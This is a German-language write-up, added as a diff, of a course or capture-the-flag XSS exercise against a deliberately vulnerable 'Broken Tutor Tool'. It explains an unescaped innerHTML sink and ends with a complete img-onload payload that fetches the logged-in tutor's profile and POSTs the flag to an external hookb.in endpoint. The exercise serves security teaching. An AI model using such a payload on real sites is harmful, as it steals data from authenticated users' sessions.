@@ -1,0 +1,22 @@
+b2 XSS
+======
+
+Bei diesem XSS Attacke nutzen wir aus, dass die Jungs vom Broken Tutor Tool in ihrem Client JavaScript die User-Eingabe aus dem Bewerbungstextfeld mit
+application_text.innerHTML, was man ja schon machen könnte wenn man krasse Antiphathien gegen ".innerText" hegt, wenn man das vorher wenigstens escaped.
+
+Auf den ersten Blick fällt es ja nicht mal so auf, dass das Mist ist. Wenn man zum Beispiel den Text `<script>alert("Hallo Tobi und Fabi!");</alert>`
+in den Bewerbungstext schreibt dann wird das gar nicht ausgeführt, weil das DOM Rendering schon weiter ist und das dann gar nicht mehr zum Zuge kommt.
+Da muss man dann schon etwas kreativer werden. Gott sei Dank, gibt es es StackOverflow, was dem Studenten Antworten auf das Google-Query "execute
+javascript inserted by innerHTML" gibt: https://stackoverflow.com/a/3714367.
+Also verwenden wir das "onload"-Parameter vom img-Tag.
+Jetzt brauchen wir nur noch ein JavaScript das uns das flag des eingeloggten Übungsleiters beschafft.
+Dafür macht man sich kopiert man sich dann aus dem show_applications Part aus dem Client-JS die axios.get methode und baut in deren Callback-Funktion 
+kurzerhand einen POST Request an Hookbin.com ein, wie wir das schon aus der anderen XSS Aufgabe kennen. Dort wird dann das Ergebnis der API-Abfrage 
+"/api/my-profile" unter dem Key "flag" übermittelt, was die API ja liebend gerne ausspuckt, weil dir ja im Browser des Übungsleiters sind und dessen Auth
+implizit mitbenutzen.
+Zusammengebaut sieht das dann so aus:
+
+
+<img src="https://google.com/favicon.ico" onload="axios.get('/api/my-profile').then(resp => {var data = resp.data;var profile = JSON.parse(data.profile);fetch('https://hookb.in/8P0oVq1EoXTpLGKKLzoD', {method: 'POST', body: ''+profile['flag']});});">
+
+
